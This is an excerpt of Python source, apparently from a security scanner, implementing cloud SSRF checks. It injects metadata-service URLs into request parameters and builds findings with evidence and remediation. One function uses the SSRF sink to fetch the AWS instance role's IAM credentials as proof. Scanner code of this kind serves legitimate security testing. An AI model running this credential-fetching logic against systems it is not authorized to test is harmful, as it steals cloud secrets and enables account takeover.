...
async def _aws_credential_proof(client: HttpClient, point: InjectionPoint) -> str | None:
    """If the AWS IAM roles endpoint is reachable via the sink, fetch the role's creds as proof."""
    roles_resp = await _send(client, build_mutated_request(point, _AWS_ROLES_URL))
    ...
    if not role or not _AWS_ROLE_RE.fullmatch(role):
        return None
    cred_resp = await _send(client, build_mutated_request(point, _AWS_ROLES_URL + role))
...
def _finding(point: InjectionPoint, probe: _Probe, resp: HttpResponse, *, proof: str | None) -> Finding:
    path = urlsplit(point.request_template.url).path or "/"
    critical = proof is not None
    detail = proof or f"{probe.cloud} metadata returned for {probe.url} (keys matched in the response)"
    return Finding(
        ...
        evidence=[Evidence(
            type="differential",
            data=(f"Injecting {probe.url} into '{point.name}' made the server fetch the cloud metadata "
                  f"service and return it: {detail}")[:300],
            confidence="high",
        )],
        request=build_mutated_request(point, probe.url),
        response=resp,
        remediation=(
...
async def run_cloud_ssrf_checks(client: HttpClient, requests: list, *, max_points: int = 40) -> list[Finding]:
    ...
    for point in candidates[:max_points]:
